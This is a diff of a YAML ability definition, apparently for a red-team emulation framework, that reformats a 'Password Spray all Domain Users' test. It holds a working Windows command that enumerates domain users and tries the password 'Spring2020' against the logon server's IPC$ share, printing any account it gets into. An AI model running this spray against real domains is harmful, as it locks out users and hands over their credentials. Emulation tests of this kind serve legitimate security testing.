@@ -1,4 +1,4 @@
-- id: bacd64a2-d80a-59cc-a252-a43fbc1e5f11
+- requirements: []
   name: Soumaia ART Tests - Password Spray all Domain Users
   description: 'CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.
 
@@ -8,17 +8,15 @@
 
     See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5'
   tactic: credential-access
-  technique:
-    attack_id: T1110.003
-    name: 'Brute Force: Password Spraying'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          cmd /c "if not exist %temp%\users.txt (exit /b 1)"
-          if not "%ERRORLEVEL%"=="0" (
-              cmd /c """.\parse_net_users.bat"""
-          )
-          @FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2020" 1>NUL 2>&1 && @echo [*] %n:Spring2020 && @net use /delete %logonserver%\IPC$ > NUL
-        payloads:
-        - parse_net_users.bat
+  technique_id: T1110.003
+  technique_name: 'Brute Force: Password Spraying'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads:
+    - parse_net_users.bat
+    parsers: []
+    command: cmd /c "if not exist %temp%\users.txt (exit /b 1)" & if not "%ERRORLEVEL%"=="0" ( cmd /c """.\parse_net_users.bat""" ) & @FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2020" 1>NUL 2>&1 && @echo [*] %n:Spring2020 && @net use /delete %logonserver%\IPC$ > NUL
+  id: bacd64a2-d80a-59cc-a252-a43fbc1e5f11
